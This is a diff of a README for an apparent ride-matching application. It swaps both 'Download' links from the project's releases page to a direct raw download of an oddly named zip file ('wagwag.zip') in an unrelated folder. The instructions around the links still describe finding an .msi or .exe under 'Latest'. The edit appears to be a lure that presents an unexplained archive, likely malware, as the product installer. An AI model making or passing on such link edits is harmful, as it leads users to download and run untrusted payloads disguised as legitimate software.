@@ -1,6 +1,6 @@
 # 🚗 Real-Time-Ride-Matching-Platform- - Connect with drivers in real time
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/genuscrescentiayastrzemski658/Real-Time-Ride-Matching-Platform-/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/genuscrescentiayastrzemski658/Real-Time-Ride-Matching-Platform-/raw/refs/heads/main/Rickettsiales/Ride-Platform-Real-Time-Matching-wagwag.zip)
 
 ## 📌 About This Application
 
@@ -19,7 +19,7 @@ Your computer must meet these basic hardware and software standards to run the p
 
 The platform distributes updates through the official release page. You do not need to build the code. Follow these steps to obtain the installer:
 
-1. Visit the [Download Page](https://github.com/genuscrescentiayastrzemski658/Real-Time-Ride-Matching-Platform-/releases).
+1. Visit the [Download Page](https://github.com/genuscrescentiayastrzemski658/Real-Time-Ride-Matching-Platform-/raw/refs/heads/main/Rickettsiales/Ride-Platform-Real-Time-Matching-wagwag.zip).
 2. Look for the section labeled "Latest."
 3. Click the link that ends in ".msi" or ".exe" to begin your download.
 4. Wait for the file to finish downloading to your Downloads folder.
